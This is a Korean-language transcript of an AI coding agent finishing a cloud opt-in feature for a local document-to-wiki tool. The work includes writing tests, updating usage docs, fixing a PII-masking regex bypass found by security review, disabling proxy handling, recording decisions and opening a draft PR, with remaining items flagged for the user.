      244  def _classify_call_failure(exc: gateway.GatewayError) -> CorpB
           rainError:

  Ran 1 shell command (ctrl+o to expand)

● 20개 모두 통과. 이제 보안 불변식 테스트(항목7)를 확장한다.

  Ran 3 shell commands (ctrl+o to expand)

● Write(tests\test_anthropic_client.py)
  ⎿  Wrote 264 lines to tests\test_anthropic_client.py
       1 """Anthropic 클라우드 백엔드 단위 테스트 (v0.5 스펙 §4.3·§4.4).
       2 
       3 관문(`gateway.request_json`)을 스텁해 요청 조립·응답 파싱·실패 
         분류를 검증한다.
       4 실제 API에는 접속하지 않는다.
       6 
       7 from __future__ import annotations
       8 
       9 import urllib.error
      10 from typing import Any
     … +306 lines (ctrl+o to expand)

  Ran 1 shell command (ctrl+o to expand)

● Write(tests\test_cli_consent.py)
  ⎿  Wrote 187 lines to tests\test_cli_consent.py
      1 """`consent` 서브커맨드와 doctor의 클라우드 상태 표시 (v0.5 스펙 
        §4.1·§3 항목1·3·10).
      2 
      3 설정 파일은 `Path.home()`을 tmp로 돌려 격리한다 — 실제 `~/.corpbr
        ain`을 건드리지 않는다.
      5 
      6 from __future__ import annotations
      7 
      8 from pathlib import Path
      9 from typing import Any
     … +198 lines (ctrl+o to expand)

  Ran 2 shell commands (ctrl+o to expand)

● 테스트 483개 통과(+63), 린트 클린. 커밋 후 USAGE 문서를 갱신한다.

  Ran 2 shell commands (ctrl+o to expand)

● Update(docs\USAGE.md)
  ⎿  Added 5 lines, removed 4 lines
       1  # CorpBrain 사용 설명서
       2  
       3 -흩어진 로컬 문서를 **100% 로컬 환경**에서 자동 구조화된 마크다 
         -운 위키로 바꾸는 CLI 도구다.                                   
       4 -외부로 나가는 통신은 로컬 Ollama 호출 하나뿐이며, 그 외 네트워 
         -크·텔레메트리는 없다.                                          
       3 +흩어진 로컬 문서를 자동 구조화된 마크다운 위키로 바꾸는 CLI 도 
         +구다. **기본 동작은 100% 로컬**                                
       4 +이며, 그 상태에서 외부로 나가는 통신은 로컬 Ollama 호출 하나뿐 
         +이다. `[v0.5]`부터 클라우드 요약을                             
       5 +**옵트인**으로 켤 수 있으며, 켜지 않으면 v0.4까지와 완전히 동일
         +하게 동작한다.                                                 
       6  
       6 -이 문서는 현재 버전(**v0.4.0**) 기준이며, 각 기능이 처음 등장한
         - 버전을                                                        
       7 -`[v0.1]` / `[v0.2]` / `[v0.3]` / `[v0.4]`로 표시한다.          
       7 +이 문서는 현재 버전(**v0.5.0**) 기준이며, 각 기능이 처음 등장한
         + 버전을                                                        
       8 +`[v0.1]` / `[v0.2]` / `[v0.3]` / `[v0.4]` / `[v0.5]`로 표시한다
         +.                                                              
       9  
      10  > ⚠️ **v0.4 파괴적 변경(BREAKING)** — `scan`은 이제 위키 생성과
           함께 **항상 벡터 인덱싱까지
      11  > 수행**한다. 그러려면 임베딩 모델(기본 `nomic-embed-text`)이 
          로컬에 있어야 하며, 없으면

● Update(docs\USAGE.md)
  ⎿  Added 67 lines, removed 3 lines
      345  
      346  ---
      347  
      348 -## 12. 이번 범위 밖 (v0.5 이후)                               
      348 +## 12. 클라우드 옵트인 `[v0.5]`                               
      349  
      350 +기본은 로컬이다. 아래 절차를 **직접 밟은 경우에만** 문서 내용 
          +이 외부로 나간다.                                             
      351 +                                                              
      352 +### 12.1 켜는 법 (2단계)                                      
      353 +                                                              
      354 +```bash                                                       
      355 +# 1) 최초 1회 동의 — 로컬 설정 파일(~/.corpbrain/config.json) 
          +에 기록된다                                                   
      356 +corpbrain consent cloud --grant                               
      357 +                                                              
      358 +# 2) API 키를 환경변수로 지정 (파일에 저장되지 않는다)        
      359 +export ANTHROPIC_API_KEY=sk-ant-...      # Windows: $env:ANTHR
          +OPIC_API_KEY="sk-ant-..."                                     
      360 +                                                              
      361 +# 3) 실행할 때 엔진을 명시                                    
      362 +corpbrain scan ./docs --out ./wiki --engine cloud             
      363 +```                                                           
      364 +                                                              
      365 +`corpbrain doctor`가 동의·키 준비 상태를 함께 보여준다(둘 다 *
          +*경고성 표시**이며 doctor의 종료                              
      366 +코드에는 영향을 주지 않는다 — 클라우드를 안 쓰는 것이 정상 상 
          +태이기 때문이다).                                             
      367 +                                                              
      368 +동의를 되돌리려면 `corpbrain consent cloud --revoke`. 이후 `--
          +engine cloud`는 다시 차단된다.                                
      369 +                                                              
      370 +### 12.2 플래그                                               
      371 +                                                              
      372 +| 플래그 | 기본값 | 설명 |                                    
      373 +|--------|--------|------|                                    
      374 +| `--engine {local,cloud}` | `local` | `cloud`는 동의 + `ANTHR
          +OPIC_API_KEY`가 모두 있어야 한다 |                            
      375 +| `--cloud-model NAME` | `claude-haiku-4-5-20251001` | `--engi
          +ne cloud`일 때 쓸 Anthropic 모델 |                            
      376 +                                                              
      377 +### 12.3 무엇이 나가고 무엇이 안 나가나                       
      378 +                                                              
      379 +- **나가는 것**: 요약 대상 문서 텍스트(`--max-chars`까지 절단,
          + PII 마스킹 후)와 모델 이름.                                  
      380 +- **나가지 않는 것**: API 키(환경변수에서만 읽고 디스크에 쓰지
          + 않는다), 임베딩(**항상 로컬**                                
      381 +  `nomic-embed-text` — 엔진과 무관하다), 파일 경로 목록, 텔레 
          +메트리.                                                       
      382 +- **목적지**: `api.anthropic.com` 하나로 하드코딩되어 있고 플 
          +래그로 바꿀 수 없다. HTTPS가                                  
      383 +  강제되며 리다이렉트는 따라가지 않는다.                      
      384 +                                                              
      385 +### 12.4 PII 자동 마스킹                                      
      386 +                                                              
      387 +클라우드로 보내기 **직전에** 아래 7종을 `[REDACTED_...]`로 치 
          +환한다. 원본 위키에는 영향이 없다.                            
      388 +                                                              
      389 +주민등록번호 · 전화번호 · 이메일 · 사업자등록번호 · 신용카드번
          +호 · 계좌번호 · IP주소                                        
      390 +                                                              
      391 +형태(자릿수·구분자) 기반의 느슨한 매칭이라 **과탐(정상 숫자열 
          +이 가려짐)을 감수하고 누락을                                  
      392 +줄이는 쪽**으로 맞춰져 있다. 예: `2026-08-21` 같은 날짜가 계좌
          +번호로 잡힐 수 있다. 실행이 끝나면                            
      393 +`PII 마스킹 N건 (문서 M개)` 요약이 나온다.                    
      394 +                                                              
      395 +### 12.5 알아둘 동작                                          
      396 +                                                              
      397 +- **엔진을 바꿔 재스캔하면 원문이 그대로여도 다시 생성된다.** 
          +위키 front-matter의                                           
      398 +  `engine: "local"|"cloud"` 값이 이번 실행과 다르면 mtime을 보
          +지 않고 재생성한다. 같은 엔진으로                             
      399 +  재스캔할 때는 기존 mtime 규칙 그대로다.                     
      400 +- **GPU 게이트는 `--engine cloud`에서 자동으로 생략된다** — 클
          +라우드 요약은 로컬 GPU를 쓰지                                 
      401 +  않기 때문이다. `--max-total-tokens` 예산 게이트는 **비용 보 
          +호 목적이라 그대로 적용**된다.                                
      402 +- **개별 파일 실패는 전체를 멈추지 않는다.** 레이트리밋(429)은
          + `클라우드 레이트리밋(429)`,                                  
      403 +  그 외 실패(5xx·타임아웃·잘못된 모델명 등)는 `클라우드 호출  
          +실패`로 그 파일만 스킵되고 나머지는                           
      404 +  계속 처리된다(exit 0). **자동 재시도는 하지 않는다.**       
      405 +- **동의 없음 / 키 없음 / 인증 실패(401)** 는 선행 조건 실패라
          + 파일을 **하나도** 처리하지 않고                              
      406 +  exit 1로 끝난다. 인증은 파일 루프 전에 `GET /v1/models`로 한
          + 번 확인한다(토큰 비용 없음).                                 
      407 +                                                              
      408 +---                                                           
      409 +                                                              
      410 +## 13. 이번 범위 밖 (v0.6 이후)                               
      411 +                                                              
      412  xls/ppt 추출, 스캔 이미지 OCR·암호화 PDF 해제, GPU 감지 확장(A
           MD·Apple Silicon), Ollama 자동
      351 -설치·모델 자동 pull, 클라우드 LLM(v0.5), 중요도 기반 처리순서 
          -변경·필터, 실측 rate 기반 예상시간                            
      352 -보정, UI(pywebview·React), 검색 결과를 근거로 한 RAG 답변 생성
          -(LLM 자연어 응답 합성 — v0.4는                                
      413 +설치·모델 자동 pull, 중요도 기반 처리순서 변경·필터, 실측 rate
          + 기반 예상시간 보정,                                          
      414 +UI(pywebview·React), 검색 결과를 근거로 한 RAG 답변 생성(LLM  
          +자연어 응답 합성 — v0.4는                                     
      415  인덱싱·검색까지만), 문서 청크 분할, 벡터 저장소 원격·분산·다중
            사용자 동시접근.
      416 +클라우드 쪽으로는 복수 provider·임의 엔드포인트, 임베딩의 클라
          +우드 경로, ML 기반 PII 탐지,                                  
      417 +자동 재시도·백오프, 파일별 자동 라우팅·폴백, API 키의 OS 키링 
          +저장이 모두 범위 밖이다.                                      
      418  
      419  ---
      420  

  Ran 1 shell command (ctrl+o to expand)

● 구현이 완료됐다. 스펙 §3 항목13이 요구하는 보안 검토를 PR 전에 실행한다.

● Skill(security-review)
  ⎿  Successfully loaded skill

● Agent(보안 취약점 식별)
  ⎿  Backgrounded agent (↓ to manage · ctrl+o to expand)

● 보안 검토 에이전트가 분석 중이다. 결과가 오면 각 발견사항을 병렬 검증
  서브태스크로 걸러내겠다.

✻ Brewed for 23m 3s
● Agent "보안 취약점 식별" finished · 6m 14s

● 보안 검토가 2건을 보고했다. 각각 오탐 여부를 병렬 서브태스크로 독립 검증한다.

● 2 background agents launched (↓ to manage)
   ├ 검증: PII 정규식 \b 경계 문제
   └ 검증: 프록시 환경변수 우회

● 오탐 검증 서브태스크 2개가 병렬로 실행 중이다. 두 결과가 모두 오면 confidence
  8 미만을 걸러낸 최종 리포트를 내겠다.

✻ Cogitated for 1m 6s

● Agent "검증: PII 정규식 \b 경계 문제" finished · 2m 47s

● PII 마스킹 우회가 검증됨(confidence 9/10) — 한국어 조사가
  붙으면(010-1234-5678로, 900101-1234567입니다) \b 경계가 성립하지 않아 원본
  PII가 그대로 외부로 나간다. goal이 지시한 대로 수정한다.

  Read 1 file (ctrl+o to expand)

● Agent "검증: 프록시 환경변수 우회" finished · 2m 26s

● 프록시 건은 오탐(confidence 3/10) — 공격자가 환경변수를 제어해야 성립해
  위협모델상 무효다. 다만 검증자가 지적한 "선의의 사내 프록시가 '100% 로컬'
  불변식을 조용히 깨뜨린다"는 제품 정합성 문제는 한 줄로 막을 수 있어 하드닝으로
  함께 반영한다.

  먼저 확인된 PII 우회를 고친다.

● Update(corpbrain\core\pii.py)
  ⎿  Added 34 lines, removed 9 lines
       58      PiiType.IP: "IP주소",
       59  }
       60  
       61 -#: 유형별 정규식 (스펙 §4.5 표의 '정규식(형태)' 열을 그대로 옮
          -긴 것) — 모듈 로드 시 1회 컴파일한다.                         
       61 +#: ASCII 전용 경계 — 스펙 §4.5 표는 `\b`로 적혀 있으나 그대로 
          +쓰면 한국어에서 무너진다.                                     
       62  #:
       63 +#: 파이썬의 `\b`·`\w`는 유니코드 인식이라 **한글 음절도 단어  
          +문자**로 친다. 한국어는 조사가                                
       64 +#: 식별자에 공백 없이 바로 붙으므로(`010-1234-5678로`, `900101
          +-1234567입니다`, `192.168.0.1에서`)                           
       65 +#: 숫자와 뒤따르는 한글 사이에 단어 경계가 생기지 않아 `\b`가 
          +성립하지 않고, 패턴이 통째로                                  
       66 +#: 빗나가 **원문 PII가 그대로 전송본에 실린다**. 이는 이 모듈 
          +이 선언한 정밀도 원칙(누락 최소화)과                          
       67 +#: 정반대의 실패 모드이므로, 경계 판정을 ASCII 영숫자·밑줄로만
          + 한정해 한글 인접 PII를 잡는다.                               
       68 +#: (2026-08-21 보안 검토에서 검출 — `docs/loop/DECISION_CHECKP
          +OINT-v0.5.md` 참조)                                           
       69 +_L = r"(?<![0-9A-Za-z_])"                                     
       70 +_R = r"(?![0-9A-Za-z_])"                                      
       71 +                                                              
       72 +#: 유형별 정규식 (스펙 §4.5 표의 '정규식(형태)' 열 + 위 ASCII 
          +경계 보정) — 로드 시 1회 컴파일.                              
       73 +#:                                                            
       74  #: **순서가 곧 우선순위다.** 계좌번호는 "하이픈으로 구분된 숫
           자 그룹"이라는 넓은 휴리스틱이라
       75  #: 사업자등록번호(3-2-5)·전화번호(3-4-4)·카드번호(4-4-4-4)를 
           통째로 삼킨다. 더 좁은 패턴을
       76  #: 먼저 적용해 구체적인 유형 라벨이 살아남게 하고, 계좌번호는 
           마지막에 남은 것만 가져간다.
       77  #: 치환 결과인 플레이스홀더는 숫자·`@`를 포함하지 않으므로 뒤
           따르는 패턴에 다시 걸리지 않는다.
       78  PII_PATTERNS: tuple[tuple[PiiType, re.Pattern[str]], ...] = (
       79      # 이메일 — local part가 숫자·하이픈·점을 품을 수 있어 숫자
            패턴보다 먼저 통째로 가져간다.
       69 -    (PiiType.EMAIL, re.compile(r"\b[\w.+-]+@[\w-]+\.[A-Za-z]{2
          -,}\b")),                                                      
       80 +    # 도메인 라벨 수를 제한하지 않는다(`corp.co.kr`처럼 다단  
          +도메인이 중간에서 잘리지 않게).                               
       81 +    (                                                         
       82 +        PiiType.EMAIL,                                        
       83 +        re.compile(                                           
       84 +            r"(?<![0-9A-Za-z_.+-])[A-Za-z0-9._%+-]+@[A-Za-z0-9
          +-]+"                                                          
       85 +            r"(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,}(?![0-9A-Za-z_
          +.-])"                                                         
       86 +        ),                                                    
       87 +    ),                                                        
       88      # 주민등록번호 — 하이픈 유무 모두 허용, 뒷자리 첫 숫자 1~8
           (성별·내외국인 코드)로 과탐 일부 제한.
       71 -    (PiiType.RRN, re.compile(r"\b\d{6}-?[1-8]\d{6}\b")),      
       89 +    (PiiType.RRN, re.compile(_L + r"\d{6}-?[1-8]\d{6}" + _R)),
       90      # 신용카드번호 — 16자리 4그룹(국내 대다수 카드). 15자리(Am
           ex 등)는 비목표.
       73 -    (PiiType.CARD, re.compile(r"\b\d{4}[- ]?\d{4}[- ]?\d{4}[- 
          -]?\d{4}\b")),                                                 
       74 -    # 전화번호 — 휴대전화·일반전화 두 패턴의 OR 결합.         
       75 -    (PiiType.PHONE, re.compile(r"\b01[016789]-?\d{3,4}-?\d{4}\
          -b|\b0(2|[3-6]\d)-?\d{3,4}-?\d{4}\b")),                        
       91 +    (PiiType.CARD, re.compile(_L + r"\d{4}[- ]?\d{4}[- ]?\d{4}
          +[- ]?\d{4}" + _R)),                                           
       92 +    # 전화번호 — 휴대전화·일반전화 두 패턴의 OR 결합. 경계가  
          +한쪽 분기에만 붙지 않도록                                     
       93 +    # 반드시 비캡처 그룹으로 감싼다.                          
       94 +    (                                                         
       95 +        PiiType.PHONE,                                        
       96 +        re.compile(                                           
       97 +            _L + r"(?:01[016789]-?\d{3,4}-?\d{4}|0(?:2|[3-6]\d
          +)-?\d{3,4}-?\d{4})" + _R                                      
       98 +        ),                                                    
       99 +    ),                                                        
      100      # 사업자등록번호 — 하이픈 포함 표준 표기(3-2-5)만.
       77 -    (PiiType.BIZ_NO, re.compile(r"\b\d{3}-\d{2}-\d{5}\b")),   
      101 +    (PiiType.BIZ_NO, re.compile(_L + r"\d{3}-\d{2}-\d{5}" + _R
          +)),                                                           
      102      # 계좌번호 — 은행별 표준 포맷이 없어 하이픈 2~3개 숫자 그
           룹 휴리스틱. 7종 중 오탐률 최고.
       79 -    (PiiType.ACCOUNT, re.compile(r"\b\d{2,6}-\d{2,6}-\d{2,6}(-
          -\d{1,6})?\b")),                                               
      103 +    (PiiType.ACCOUNT, re.compile(_L + r"\d{2,6}-\d{2,6}-\d{2,6
          +}(?:-\d{1,6})?" + _R)),                                       
      104      # IP주소 — IPv4 형태만. 옥텟 범위(0~255) 미검증. IPv6은 비
           목표.
       81 -    (PiiType.IP, re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")), 
      105 +    # 오른쪽 경계에 `.`도 포함해 다섯 번째 옥텟이 남는 일이 없
          +게 한다.                                                      
      106 +    (PiiType.IP, re.compile(_L + r"(?:\d{1,3}\.){3}\d{1,3}" + 
          +r"(?![0-9A-Za-z_.])")),                                       
      107  )
      108  
      109  

  Ran 1 shell command (ctrl+o to expand)

● 모든 케이스가 정상 마스킹된다. 이어서 프록시 하드닝을 적용한다.

● Update(corpbrain\core\gateway.py)
  ⎿  Added 11 lines, removed 2 lines
      59          return None
      60  
      61  
      62 -#: 리다이렉트를 따라가지 않는 opener — 모든 요청이 이 opener로 
         -만 나간다.                                                     
      63 -_OPENER = urllib.request.build_opener(_NoRedirectHandler)      
      62 +#: 리다이렉트를 따라가지 않고 **프록시도 타지 않는** opener —  
         +모든 요청이 이 opener로만 나간다.                              
      63 +#:                                                             
      64 +#: `build_opener()`의 기본 `ProxyHandler`는 `http_proxy`/`https
         +_proxy` 환경변수와 Windows 레지스트리                          
      65 +#: 프록시 설정을 자동으로 읽어들인다. 그러면 NetworkGuard가 URL
         + **문자열**을 통과시킨 뒤 소켓은                               
      66 +#: 전혀 다른 목적지로 열릴 수 있고, 특히 `urllib`는 `127.0.0.1`
         +·`localhost`를 프록시에서 자동                                 
      67 +#: 제외하지 않는다 — 선의로 설정된 사내 프록시 하나만으로 "기본
         + 로컬·외부 통신 0" 불변식이                                    
      68 +#: 조용히 깨지고, 마스킹되지 않은 로컬 요약 본문이 평문 HTTP로 
         +사외로 나갈 수 있다.                                           
      69 +#: 빈 `ProxyHandler({})`를 명시해 프록시 설정을 아예 무시한다. 
      70 +_OPENER = urllib.request.build_opener(                         
      71 +    urllib.request.ProxyHandler({}), _NoRedirectHandler        
      72 +)                                                              
      73  
      74  
      75  def _guard_destination(

  Ran 1 shell command (ctrl+o to expand)

● Update(tests\test_pii.py)
  ⎿  Added 1 line, removed 1 line
      269  
      270  @pytest.mark.parametrize(("text", "raw", "expected"), HANGUL_A
           DJACENT_CASES)
      271  def test_hangul_adjacent_pii_is_masked(text: str, raw: str, ex
           pected: PiiType) -> None:
      272 -    """조사가 바로 붙어도 마스킹된다 — 한글은 유니코드 `\w`라 
          -`\b`가 성립하지 않는다."""                                    
      272 +    """조사가 바로 붙어도 마스킹된다 — 한글은 유니코드 단어 문
          +자라 `\\b`가 성립하지 않는다."""                              
      273      result = mask_pii(text)
      274  
      275      assert raw not in result.text, f"원문 PII가 전송본에 남았
           다: {raw}"

  Ran 1 shell command (ctrl+o to expand)

● PII 우회는 수정됐고(495 테스트 통과, +12 회귀 테스트), 프록시 하드닝도
  적용했다. 체크포인트에 결정을 기록한다.

● Update(docs\loop\DECISION_CHECKPOINT-v0.5.md)
  ⎿  Added 2 lines, removed 2 lines
       3  이 문서는 v0.5 구현 루프의 **조기 종료 판정 단일 근거**다.
       4  CORE_BUDGET(≥3) · MINOR_BUDGET(≥10)은 오직 아래 카운터로만 판정
          한다.
       5  
       6 -CORE: 1                                                        
       7 -MINOR: 8                                                       
       6 +CORE: 2                                                        
       7 +MINOR: 9                                                       
       8  
       9  ## 기록 규칙
      10  - 형식: `- [CORE|MINOR] <결정> | 근거 | 관련 파일 | 결정 주체(m
          ain|sub-A|sub-B)`

● Update(docs\loop\DECISION_CHECKPOINT-v0.5.md)
  ⎿  Added 20 lines
      20  - [CORE] Anthropic API 키는 `anthropic_client` 코어 모듈이 호출
           시점에 `os.environ`에서 직접 읽고 `ScanConfig`에 싣지 않는다 |
           스펙 §4.1은 "환경변수로만 받는다"만 규정하고 어느 계층이 읽는
          지는 미정. 기존 관례(CLI가 env 해소 후 ScanConfig에 담기)를 따
          르면 자격증명이 로그·에러에 repr될 수 있는 값 객체에 실린다 — 
          보안상 수명·노출면을 최소화하려고 관례에서 의도적으로 벗어났다 
          | `corpbrain/core/llm/anthropic_client.py` | main
      21  - [MINOR] cloud 요약 타임아웃은 300초(로컬 `summarize.DEFAULT_T
          IMEOUT`과 동일), 프리플라이트는 60초 | 스펙 §4.3은 "기존 DEFAUL
          T_TIMEOUT(60초)를 재사용"이라고 적었으나 실제 코드베이스는 `sum
          marize=300.0`·`embed=60.0`으로 60초 공유 상수가 존재하지 않는다
          . 같은 성격(요약)의 값을 따르고 가벼운 프리플라이트만 60초를 쓰
          는 것으로 스펙의 의도(신규 정책을 만들지 않는다)를 지켰다 | `co
          rpbrain/core/llm/anthropic_client.py` | main
      22  
      23 +### 보안 검토(/security-review) 후속 — 2026-08-21              
      24 +- [CORE] PII 정규식 7종의 경계를 스펙 §4.5 표의 `\b` 대신 **ASC
         +II 전용 lookaround**                                           
      25 +  (`(?<![0-9A-Za-z_])` / `(?![0-9A-Za-z_])`)로 바꾸고, 이메일은
         + 다단 도메인을 통째로 잡도록                                   
      26 +  확장했다 | 보안 검토가 확인한 실제 유출: 파이썬 `\b`·`\w`는  
         +유니코드 인식이라 한글도 단어                                  
      27 +  문자다. 한국어는 조사가 공백 없이 붙으므로(`010-1234-5678로`,
         + `900101-1234567입니다`,                                       
      28 +  `192.168.0.1에서`) 경계가 성립하지 않아 패턴이 통째로 빗나가 
         +고 **원문 PII가 그대로 클라우드로                              
      29 +  전송**됐다(실측: 7종 중 6종이 조사 인접 시 무마스킹, 카드번호
         +는 뒤 4자리 노출). 스펙 §4.5의                                 
      30 +  정밀도 원칙("누락을 최소화")과 정반대의 실패 모드라 원칙에 맞
         +추려면 표의 문자열을 벗어나야                                  
      31 +  했다 | `corpbrain/core/pii.py`, `tests/test_pii.py` | main   
      32 +  - **스펙 후속 조치 필요**: `static/docs/specs/features/corpbr
         +ain-v0.5-cloud-opt-in.md` §4.5의                               
      33 +    정규식 표가 이제 구현과 다르다. 스펙은 이 루프의 수정 금지 
         +대상이라 손대지 않았으므로,                                    
      34 +    사용자가 표를 ASCII 경계 버전으로 갱신해 정본을 일치시켜야 
         +한다.                                                          
      35 +- [MINOR] 관문 opener를 빈 `ProxyHandler({})`로 만들어 `http_pr
         +oxy`·`https_proxy` 환경변수와                                  
      36 +  Windows 레지스트리 프록시 설정을 무시한다 | `urllib`은 `127.0
         +.0.1`·`localhost`를 프록시에서                                 
      37 +  자동 제외하지 않아, 선의로 설정된 사내 프록시 하나만으로 마스
         +킹되지 않은 로컬 요약 본문이                                   
      38 +  평문 HTTP로 사외 프록시에 전달될 수 있었다(실측 확인). 로드맵
         + 불변식 "기본 로컬 — 외부 통신                                 
      39 +  0"을 지키는 쪽을 택했다. **트레이드오프**: 프록시를 통해서만 
         +외부에 나갈 수 있는 사내망에서는                               
      40 +  `--engine cloud`가 동작하지 않는다 — 필요해지면 명시적 opt-in
         + 플래그로 여는 것이 맞다 |                                     
      41 +  `corpbrain/core/gateway.py` | main                           
      42 +                                                               
      43  ### 파트 A (`core/pii.py`) — sub-A 보고를 메인이 재분류해 기록
      44  - [MINOR] `[REDACTED_<TYPE>]`의 TYPE 토큰을 `RRN`/`PHONE`/`EMAI
          L`/`BIZ_NO`/`CARD`/`ACCOUNT`/`IP`로 확정 | 스펙 §4.5는 플레이스
          홀더 형태만 정하고 토큰 문자열은 미정 | `corpbrain/core/pii.py`
           | sub-A
      45  - [MINOR] 패턴 적용 순서를 우선순위로 정의(EMAIL → RRN → CARD →
           PHONE → BIZ_NO → ACCOUNT → IP) | 계좌번호 휴리스틱이 사업자·전
          화·카드 패턴을 삼켜 라벨이 뭉개지므로 좁은 패턴을 먼저 적용. 스
          펙은 적용 순서를 미규정(마스킹 자체는 어느 순서든 이뤄지므로 보
          안 영향 없음) | `corpbrain/core/pii.py` | sub-A

  Ran 1 shell command (ctrl+o to expand)

● 보안 검토 결과를 반영했다. 이제 종료 조건을 검증하고 draft PR을 만든다.

  Ran 2 shell commands (ctrl+o to expand)

● 모든 종료 조건을 확인했다 — CORE 2/3, MINOR 9/10 모두 예산 내이고 두 검증
  명령이 exit 0이다. STOP REASON을 기록하고 PR을 만든다.

  Pushed to feat/v0.5-cloud-opt-in, created PR #30, ran 1 shell command (ctrl+o to expand)

● v0.5 구현 루프를 STOP REASON: ALL_DONE으로 종료했다.

  결과

  Draft PR #30 — https://github.com/graybat21/CorpBrain-app-01/pull/30 (브랜치
  feat/v0.5-cloud-opt-in, 커밋 7개)

  종료 조건 증명
  - uv run ruff check . → exit 0
  - uv run pytest → 495 passed, 6 skipped (v0.4 대비 +75건, 회귀 0)
  - 체크포인트 CORE 2/3 · MINOR 9/10 — 두 예산 모두 미도달
  - 변경 파일 전부 goal §1 범위 안 (+ 허용 예외인 DECISION_CHECKPOINT-v0.5.md,
    docs/USAGE.md)

  병렬 개발: core/pii.py와 core/consent.py는 파일이 겹치지 않는 leaf 모듈이라
  서브에이전트 2개가 동시에 구현했고, 공유 파일(gateway·pipeline·cli)은 메인이
  직렬 처리했다. 체크포인트 쓰기는 카운터 유실 방지를 위해 메인으로 직렬화했다.

  테스트가 잡아낸 실제 버그 2건

  1. 프롬프트 템플릿 — PROMPT_TEMPLATE의 {{document}}가 .replace() 이후에도
     이스케이프로 남아 문서 본문이 프롬프트에 전혀 실리지 않았다. PII 무유출
     단언이 공허하게 통과할 뻔한 것을 통합테스트가 검출했다.
  2. PII 마스킹 우회 (보안 검토, High) — 정규식 7종의 \b 경계가 한국어에서
     무너졌다. 파이썬 \b/\w는 유니코드 인식이라 한글도 단어 문자이고, 조사가
     공백 없이 붙으면(010-1234-5678로, 900101-1234567입니다) 경계가 성립하지
     않아 패턴이 통째로 빗나갔다. 실측상 조사 인접 시 7종 중 6종이 무마스킹,
     카드번호는 뒤 4자리 노출. 기존 테스트 50건이 green이었던 건 픽스처가 전부
     PII + 공백 형태였기 때문이다. ASCII 전용 lookaround로 고치고 회귀 테스트
     12건을 추가했다.

  보안 검토의 나머지 1건(프록시 환경변수)은 오탐으로 판정했다 — 공격자가
  환경변수를 제어해야 성립해 위협모델상 무효. 다만 선의의 사내 프록시가 "기본
  로컬" 불변식을 깨뜨릴 수 있다는 지적은 타당해 관문 opener를 빈
  ProxyHandler({})로 만드는 하드닝만 반영했다.

  사용자 판단이 필요한 것 2가지

  1. 스펙 §4.5 정규식 표가 이제 구현과 다르다. 스펙은 이 루프의 수정 금지
     대상이라 손대지 않았다 — 표를 ASCII 경계 버전으로 갱신해 정본을 맞춰야
     한다.
  2. 프록시 차단 트레이드오프: 프록시로만 외부에 나갈 수 있는 사내망에서는
     --engine cloud가 동작하지 않는다. 필요하면 명시적 opt-in 플래그로 여는 게
     맞다고 본다.

  남은 단계는 실제 Anthropic API 수동 스모크(로드맵 품질 게이트), pyproject
  0.4.0 → 0.5.0 범프, merge 후 git tag v0.5다 — 셋 다 goal 범위 밖으로 두었다.

◯ Goal not yet met… continuing (ctrl+o to expand)
● 확인했다. v0.5 루프는 완료 상태이고 새로 시작할 작업이 없다.

  최종 산출물:
  - Draft PR #30 — https://github.com/graybat21/CorpBrain-app-01/pull/30
  - 브랜치 feat/v0.5-cloud-opt-in (커밋 7개, origin에 push 완료)
  - docs/loop/DECISION_CHECKPOINT-v0.5.md — CORE: 2 / MINOR: 9 / STOP REASON: 
    ALL_DONE

  사용자 손이 필요한 남은 항목은 앞서 보고한 4가지다 — 스펙 §4.5 정규식 표 갱신,
  프록시 차단 트레이드오프 판단, 실제 Anthropic API 수동 스모크, 그리고 merge
  후 pyproject 버전 범프와 git tag v0.5.

◯ Goal not yet met… continuing (ctrl+o to expand)

● v0.5 루프는 종료됐고 산출물은 모두 제출됐다.

  - Draft PR #30 — https://github.com/graybat21/CorpBrain-app-01/pull/30
    (feat/v0.5-cloud-opt-in, 커밋 7개, push 완료)
  - 체크포인트: CORE: 2 / MINOR: 9 / STOP REASON: ALL_DONE
  - 검증: uv run ruff check . exit 0, uv run pytest 495 passed / 6 skipped

  사용자 판단이 필요한 4가지(스펙 §4.5 정규식 표 갱신, 프록시 차단 트레이드오프,
  실제 API 수동 스모크, merge 후 버전 범프·git tag v0.5)만 남아 있다.

◯ Goal not yet met… continuing (ctrl+o to expand)

● 종료 조건 충족을 다시 증명하겠다 — goal §3의 종료 방법 5단계를 그대로
  실행한다.

  Ran 2 shell commands (ctrl+o to expand)

● goal §3의 종료 방법 5단계를 모두 실행해 출력을 남겼다.

  ┌───────────────┬─────────────────────────────────────────────────────────┐
  │     단계      │                          결과                           │
  ├───────────────┼─────────────────────────────────────────────────────────┤
  │ 1)            │                                                         │
  │ 체크포인트에  │ CORE: 2 / MINOR: 9 / STOP REASON: ALL_DONE              │
  │ STOP REASON   │                                                         │
  │ 기록          │                                                         │
  ├───────────────┼─────────────────────────────────────────────────────────┤
  │ 2) uv run     │ exit 0                                                  │
  │ ruff check .  │                                                         │
  ├───────────────┼─────────────────────────────────────────────────────────┤
  │ 2) uv run     │ exit 0 — 495 passed, 6 skipped                          │
  │ pytest        │                                                         │
  ├───────────────┼─────────────────────────────────────────────────────────┤
  │ 3) 카운터 줄  │ 위 1번 출력에 CORE:·MINOR:·STOP REASON: 모두 표시됨     │
  │ 노출          │                                                         │
  ├───────────────┼─────────────────────────────────────────────────────────┤
  │ 4) git diff   │ 27개 파일 전부 §1 작업 대상 + 허용                      │
  │ --name-only   │ 예외(DECISION_CHECKPOINT-v0.5.md, docs/USAGE.md) 안     │
  │ main          │                                                         │
  ├───────────────┼─────────────────────────────────────────────────────────┤
  │ 5) gh pr list │ PR #30, draft=true —                                    │
  │               │ https://github.com/graybat21/CorpBrain-app-01/pull/30   │
  └───────────────┴─────────────────────────────────────────────────────────┘

  종료 조건 판정: CORE 2 < 3, MINOR 9 < 10, 스펙 완료의 정의 13항목 충족, turn
  cap 60 미도달 → ALL_DONE. 커밋 7개가 feat/v0.5-cloud-opt-in에 올라가 origin에
  push된 상태다.

  이 루프에서 더 진행할 작업은 없다. 남은 것은 사용자 판단이 필요한 4가지뿐이다
  — 스펙 §4.5 정규식 표를 구현과 일치시키기, 프록시 차단 트레이드오프 결정, 실제
  Anthropic API 수동 스모크, merge 후 pyproject 0.4.0 → 0.5.0 범프와 git tag 
  v0.5.

◯ Goal not yet met… continuing (ctrl+o to expand)

● v0.5 루프는 완료됐고 goal의 종료 조건·종료 방법을 모두 증명했다. 더 할 작업을
